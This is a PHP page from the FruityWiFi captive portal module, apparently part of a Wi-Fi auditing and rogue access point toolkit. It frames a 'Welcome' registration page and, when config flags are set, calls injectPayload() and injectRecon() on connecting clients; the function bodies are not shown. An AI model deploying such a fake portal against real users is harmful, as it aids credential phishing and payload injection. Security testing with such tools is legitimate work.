<?php
/*
    Copyright (C) 2013-2016 xtr4nge [_AT_] gmail.com

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/ 
?>
<?php
header("Expires: Mon, 1 Jan 1900 00:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
?>
<?php
include "/usr/share/fruitywifi/www/config/config.php";
include "/usr/share/fruitywifi/www/modules/captive/_info_.php";
include "/usr/share/fruitywifi/www/functions.php";
include "_portal_functions.php";
?>
<!DOCTYPE html>
<html>
<head>
<title>Welcome</title>
<meta name="viewport" content="target-densitydpi=device-dpi">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<link rel="shortcut icon" href="wifi.ico" type="image/x-icon" />
</head>

<style>	
	html, body {
		margin: 0;
		height: 100%;
		overflow: auto;
	}
</style>
<body>
	
<iframe src="<?=$mod_captive_template;?>/register.php" width="100%" height="100%" frameborder="0" scrolling="no">
	
</iframe>

<?
// ----- INJECT PAYLOAD -----
if ($mod_captive_inject == "1") injectPayload();

// ----- INJECT RECON -----
if ($mod_captive_recon == "1") injectRecon();
?>
</body>
</html>